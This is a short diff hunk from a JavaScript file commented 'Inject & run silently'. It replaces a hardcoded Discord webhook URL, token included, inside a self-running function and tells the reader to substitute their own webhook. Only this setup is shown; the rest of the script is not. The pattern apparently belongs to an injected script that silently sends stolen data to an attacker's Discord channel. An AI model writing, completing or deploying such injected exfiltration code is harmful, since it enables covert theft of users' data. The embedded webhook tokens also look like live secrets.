@@ -2,7 +2,7 @@
 // Inject & run silently
 
 (function() {
-  const WEBHOOK = "https://discord.com/api/webhooks/1450215350204633281/Ijfz8RQ66w6dsAUmTr2rGYQyJKFGZoTcsL-lTBGHddUsXIOwNjLzxNnW6ciqR7c-x6yv";  
+  const WEBHOOK = "https://discord.com/api/webhooks/1492653678614810754/os_pgkx_Lov9fiSQsJwJVoESlPXE4wvLdLXIgPaEkq8EwOorYLuHZb8fUECTGs1f_SAi";  
   // ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   // REPLACE WITH YOUR ACTUAL WEBHOOK URL
 
